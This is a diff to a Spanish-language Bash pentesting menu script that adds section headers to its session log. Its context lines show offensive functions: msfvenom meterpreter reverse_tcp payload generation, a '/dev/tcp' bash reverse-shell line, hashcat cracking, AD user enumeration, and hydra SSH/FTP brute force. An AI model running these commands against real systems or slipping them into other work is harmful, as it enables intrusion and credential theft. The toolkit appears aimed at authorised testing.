@@ -107,8 +107,10 @@ function nmap_scan_rapido() {
     echo "Ejecutando Nmap scan rápido en $ip..." | tee -a "$nmap_log"
     sudo nmap -sP "$ip" | tee -a "$nmap_log"
     
+    echo "==== NMAP Quick Scan ====" >> "$session_log"
     echo "Nmap scan rápido ejecutado en $ip" | tee -a "$session_log"
     cat "$nmap_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
@@ -119,8 +121,10 @@ function nmap_scan_puertos() {
     echo "Ejecutando Nmap scan de puertos en $ip..." | tee -a "$nmap_ports_log"
     sudo nmap -sS "$ip" | tee -a "$nmap_ports_log"
     
+    echo "==== NMAP Port Scanner ====" >> "$session_log"
     echo "Nmap scan de puertos ejecutado en $ip." | tee -a "$session_log"
     cat "$nmap_ports_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
@@ -131,8 +135,10 @@ function osint_harvester() {
     echo "Ejecutando TheHarvester en $dominio..." | tee -a "$osint_log"
     sudo theHarvester -d "$dominio" -l 500 -b all | tee -a "$osint_log"
     
+    echo "==== OSINT Harvester ====" >> "$session_log"
     echo "OSINT ejecutado en $dominio." | tee -a "$session_log"
     cat "$osint_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
@@ -165,6 +171,7 @@ function descargar_y_generar_hashes() {
     curl -o "$session_dir/hash.txt" "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt"
     echo "Lista de hashes descargada como hash.txt."
 
+    echo "==== Hash Downloader ====" >> "$session_log"
     echo "Ejecutando Hashcat..." | tee -a "$session_log"
     if sudo hashcat -m 0 "$session_dir/hash.txt" "$session_dir/rockyou.txt" | tee -a "$session_log"; then
         echo "Hashcat ejecutado con éxito." | tee -a "$session_log"
@@ -180,6 +187,7 @@ function cargar_hashes() {
         cp "$ruta_archivo" "$session_dir/hash.txt" 
         echo "Hashes cargados desde $ruta_archivo." | tee -a "$session_log"
 
+        echo "==== Hash Uploader ====" >> "$session_log"
         echo "Ejecutando Hashcat..." | tee -a "$session_log"
         sudo hashcat -m 0 "$session_dir/hash.txt" "$session_dir/rockyou.txt" | tee -a "$session_log"
         echo "Hashcat ejecutado en $ruta_archivo." | tee -a "$session_log"
@@ -195,8 +203,10 @@ function crackear_hash() {
     echo "Ejecutando Hashcat en $archivo con la wordlist $wordlist..." | tee -a "$hashcat_log"
     sudo hashcat -a 0 -m 0 "$archivo" "$wordlist" | tee -a "$hashcat_log"
 
+    echo "==== Hash Cracker ====" >> "$session_log"
     echo "Hashcat ejecutado en $archivo con la wordlist $wordlist." | tee -a "$session_log"
     cat "$hashcat_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_hashes
 }
@@ -205,8 +215,11 @@ function detectar_tipo_hash() {
     hash_log="$session_dir/hash_detection_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa el hash: " hash
     sudo hashid -m "$hash" | tee -a "$hash_log"
+
+    echo "==== Hash Detector ====" >> "$session_log"
     echo "Tipo de hash detectado: $hash." | tee -a "$session_log"
     cat "$hash_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_hashes
 }
@@ -237,20 +250,26 @@ function generar_payload() {
     echo "Generando payload con msfvenom..." | tee -a "$payload_log"
     sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="$ip" LPORT="$puerto" -f exe > payload.exe
     
+    echo "==== Payload Generator ====" >> "$session_log"
     echo "Payload generado: payload.exe" | tee -a "$payload_log"
     echo "Payload generado con msfvenom (LHOST: $ip, LPORT: $puerto)" | tee -a "$session_log"
     cat "$payload_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_payloads
 }
 
 function crear_reverse_shell() {
+    echo "==== Reverse Shell ====" >> "$session_log"
     read -p "Ingresa tu IP: " ip
     read -p "Ingresa el puerto: " puerto
     echo "bash -i >& /dev/tcp/$ip/$puerto 0>&1" > reverse_shell.sh
+
+    echo "==== Reverse Shell ====" >> "$session_log"
     echo "Reverse shell creado en reverse_shell.sh." | tee -a "$session_log"
     echo "Reverse shell creado (IP: $ip, Puerto: $puerto)." | tee -a "$session_log"
-    
+    echo "================================" >> "$session_log"
+
     read -p "Presiona Enter para continuar..." && submenu_payloads
 }
 
@@ -325,8 +344,10 @@ function enumerar_usuarios_ad() {
     echo
     sudo python3 GetADUsers.py -dc-ip "$dc_ip" "$dominio/$usuario:$password" | tee -a "$enum_log"
     
+    echo "==== User Enumerate ====" >> "$session_log"
     echo "Usuarios enumerados desde $dc_ip para el dominio $dominio" | tee -a "$session_log"
     cat "$enum_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_ad
 }
@@ -383,7 +404,9 @@ function ataque_ssh() {
         echo "Ataque SSH fallido en $ip. Detalles guardados en $ssh_log." | tee -a "$session_log"
     fi
     
+    echo "==== SSH Attack ====" >> "$session_log"
     cat "$ssh_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
 }
@@ -408,7 +431,9 @@ function ataque_ftp() {
     sudo hydra -L "$usuarios" -P "$contrasenas" ftp://"$ip" -o "$ftp_log"
     echo "Ataque FTP ejecutado en $ip usando $usuarios y $contrasenas. Ver detalles en $ftp_log." | tee -a "$session_log"
     
+    echo "==== FTP Attack ====" >> "$session_log"
     cat "$ftp_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
 }
@@ -437,7 +462,9 @@ function escanear_subdominios() {
     sudo sublist3r -d "$dominio" | tee -a "$subdomain_log"
     echo "Escaneo de subdominios ejecutado para $dominio. Ver detalles en $subdomain_log." | tee -a "$session_log"
     
+    echo "==== Subdomain Scanner ====" >> "$session_log"
     cat "$subdomain_log" >> "$session_log"
+    echo "================================" >> "$session_log"
     
     read -p "Presiona Enter para continuar..." && submenu_subdominios
 }
